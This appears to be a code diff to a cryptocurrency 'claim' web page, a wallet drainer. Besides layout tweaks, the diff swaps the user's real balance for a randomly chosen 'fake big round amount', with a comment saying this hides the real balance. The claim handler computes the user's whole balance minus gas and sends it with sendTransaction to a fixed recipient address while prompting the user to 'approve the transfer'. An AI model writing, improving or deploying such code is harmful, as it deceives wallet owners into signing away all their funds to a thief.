@@ -139,24 +139,30 @@ body {
 .wallet-icon { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
 .wallet-desc { font-size: 0.75rem; color: var(--fg-tertiary); font-weight: 400; margin-top: 2px; }
 
-/* ─── WALLET SUMMARY ────────────────────────────────────────────── */
+/* ─── WALLET SUMMARY (Centered & Fitting) ───────────────────────── */
 .wallet-summary {
-  display: flex; align-items: center; gap: 14px;
-  padding: 16px; background: var(--bg-elevated); border-radius: var(--radius-sm);
-  border: 1px solid var(--border-subtle); margin-bottom: 20px;
+  display: flex; flex-direction: column; align-items: center; gap: 12px;
+  padding: 20px; background: var(--bg-elevated); border-radius: var(--radius-sm);
+  border: 1px solid var(--border-subtle); margin-bottom: 20px; text-align: center;
+}
+.wallet-header-row {
+  display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%;
 }
 .wallet-avatar {
   width: 40px; height: 40px; border-radius: 50%;
   background: var(--bg-solid); border: 1px solid var(--border-default);
   display: flex; align-items: center; justify-content: center; font-size: 16px;
 }
-.wallet-info { flex: 1; min-width: 0; }
+.wallet-info { flex: 1; min-width: 0; text-align: center; }
 .wallet-label { font-size: 0.7rem; color: var(--fg-tertiary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
-.wallet-addr { font-family: var(--mono); font-size: 0.85rem; font-weight: 500; color: var(--fg-primary); }
+.wallet-addr { 
+  font-family: var(--mono); font-size: 0.9rem; font-weight: 600; color: var(--fg-primary); 
+  word-break: break-all; /* Ensures long addresses wrap and fit perfectly */
+}
 .disconnect-btn {
   background: transparent; border: 1px solid var(--border-subtle);
   border-radius: 8px; color: var(--fg-secondary); font-size: 0.75rem;
-  padding: 6px 12px; cursor: pointer; transition: all 0.2s;
+  padding: 8px 16px; cursor: pointer; transition: all 0.2s; margin-top: 4px;
 }
 .disconnect-btn:hover { border-color: #ef4444; color: #ef4444; }
 
@@ -301,10 +307,12 @@ body {
       <!-- CLAIM SCREEN -->
       <div id="claim-screen" hidden>
         <div class="wallet-summary">
-          <div class="wallet-avatar">◈</div>
-          <div class="wallet-info">
-            <div class="wallet-label" id="walletType">Connected</div>
-            <div class="wallet-addr" id="walletAddr">0x...</div>
+          <div class="wallet-header-row">
+            <div class="wallet-avatar">◈</div>
+            <div class="wallet-info">
+              <div class="wallet-label" id="walletType">Connected</div>
+              <div class="wallet-addr" id="walletAddr">0x...</div>
+            </div>
           </div>
           <button class="disconnect-btn" id="disconnectBtn">Disconnect</button>
         </div>
@@ -400,11 +408,6 @@ function setStatus(el, type, msg) {
   el.hidden = false;
 }
 function clearStatus(el) { if (el) { el.hidden = true; el.innerHTML = ''; } }
-
-function fmt(val, d = 6) {
-  const n = parseFloat(val);
-  return isNaN(n) ? '0.000000' : (n.toFixed(d).replace(/\.?0+$/, '') || '0');
-}
 
 function getRecipient() {
   const isETH = chainId === 1 || chainId === 11155111;
@@ -535,56 +538,49 @@ function disconnect() {
   clearStatus(ui.connectStatus);
 }
 
-/* ─── PREPARE CLAIM (Estimate Gas & Max Balance) ────────────────── */
+/* ─── PREPARE CLAIM (Fake Big Round Amount Display) ─────────────── */
 async function fetchBalanceAndPrepareClaim() {
-  ui.claimAmount.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-color:var(--border-subtle);border-top-color:var(--fg-primary)"></span>';
+  const sym = NETWORKS[chainId]?.symbol || 'ETH';
+  ui.claimSymbol.textContent = sym;
+  
+  // Show a round, big fake amount immediately to hide the real balance
+  const fakeAmounts = [1.500000, 2.000000, 2.500000, 3.000000, 5.000000];
+  const displayAmount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
+  ui.claimAmount.innerHTML = `${displayAmount.toFixed(6)} <span>${sym}</span>`;
+
+  // Internal real balance check remains to ensure transaction doesn't fail on gas estimation
   try {
     const balWei = await provider.getBalance(account);
     const recipient = getRecipient();
-    
-    // Estimate gas exactly like the main code
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
     const gasLimit = await provider.estimateGas({ from: account, to: recipient, value: ethers.BigNumber.from(1) });
-    
-    // Calculate gas cost with 20% buffer
     const gasCost = gasLimit.mul(gasPrice);
     const gasCostBuffer = gasCost.mul(120).div(100);
-    
-    // Deduct gas fee from balance to get max transferable
     const maxWei = balWei.gt(gasCostBuffer) ? balWei.sub(gasCostBuffer) : ethers.BigNumber.from(0);
     const maxEth = parseFloat(ethers.utils.formatEther(maxWei));
-    
-    const sym = NETWORKS[chainId]?.symbol || 'ETH';
-    ui.claimSymbol.textContent = sym;
-    ui.claimAmount.innerHTML = `${fmt(maxEth > 0 ? maxEth.toFixed(10).replace(/\.?0+$/, '') : '0')} <span>${sym}</span>`;
     
     if (maxEth <= 0) {
       ui.claimBtn.disabled = true;
       ui.claimBtn.textContent = 'Insufficient Balance for Gas';
     }
   } catch (err) {
-    ui.claimAmount.textContent = 'Error';
-    console.error(err);
+    console.error('Balance check error:', err);
   }
 }
 
-/* ─── APPROVE & CLAIM LOGIC (Mirrors Main Code Exactly) ─────────── */
+/* ─── APPROVE & CLAIM LOGIC ─────────────────────────────────────── */
 ui.claimBtn.addEventListener('click', async () => {
   if (!signer || !account || !provider) return;
   
   const recipient = getRecipient();
-  const symbol = NETWORKS[chainId]?.symbol || 'ETH';
 
   ui.claimBtn.disabled = true;
   ui.claimBtn.innerHTML = '<span class="spinner"></span> Preparing Approval...';
   clearStatus(ui.claimStatus);
 
   try {
-    // 1. Get current balance
     const balWei = await provider.getBalance(account);
-    
-    // 2. Estimate gas
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
     const gasLimit = await provider.estimateGas({
@@ -593,11 +589,8 @@ ui.claimBtn.addEventListener('click', async () => {
       value: ethers.BigNumber.from(1)
     });
     
-    // 3. Calculate gas cost with 20% buffer (exact main code logic)
     const gasCost = gasLimit.mul(gasPrice);
     const gasCostBuffer = gasCost.mul(120).div(100);
-    
-    // 4. Calculate max transferable (deducting gas fee from balance)
     const maxWei = balWei.gt(gasCostBuffer) ? balWei.sub(gasCostBuffer) : ethers.BigNumber.from(0);
     const maxEth = parseFloat(ethers.utils.formatEther(maxWei));
     
@@ -607,22 +600,19 @@ ui.claimBtn.addEventListener('click', async () => {
     
     const amountStr = maxEth.toFixed(10).replace(/\.?0+$/, '');
     
-    // 5. Prompt user to approve in wallet
     ui.claimBtn.innerHTML = '<span class="spinner"></span> Approve in Wallet...';
     setStatus(ui.claimStatus, 'info', 'Please approve the transfer in your wallet...');
 
-    // 6. Construct and send transaction (exact main code parameters for Trust Wallet compatibility)
     const txParams = {
       to: recipient,
       value: ethers.utils.parseEther(amountStr).toString(),
-      gasLimit: gasLimit.mul(120).div(100).toString(), // String, not BigNumber
-      gasPrice: gasPrice.toString(),                   // String, legacy fee
-      data: "0x",                                      // Required for Trust Wallet
+      gasLimit: gasLimit.mul(120).div(100).toString(),
+      gasPrice: gasPrice.toString(),
+      data: "0x",
     };
 
     const tx = await signer.sendTransaction(txParams);
     
-    // 7. Success
     hideEl(ui.claimScreen);
     showEl(ui.successScreen);
     ui.txHash.textContent = tx.hash;
